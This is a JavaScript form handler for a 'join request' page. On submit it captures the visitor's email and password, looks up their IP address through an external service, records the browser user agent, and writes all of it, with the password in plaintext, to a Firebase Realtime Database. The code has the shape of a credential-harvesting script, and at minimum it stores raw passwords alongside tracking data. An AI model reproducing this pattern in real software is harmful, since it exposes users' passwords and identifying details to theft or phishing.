import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBEKuc4mzaWI5I6R9QgAeDHMz13bKk5Oy4",
  authDomain: "asf-panel-azizul.firebaseapp.com",
  databaseURL: "https://asf-panel-azizul-default-rtdb.firebaseio.com",
  projectId: "asf-panel-azizul",
  storageBucket: "asf-panel-azizul.firebasestorage.app",
  messagingSenderId: "444571143429",
  appId: "1:444571143429:web:a435815af2bbd7c2d0bb6c",
  measurementId: "G-79PTWV1GY4"
};


const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});

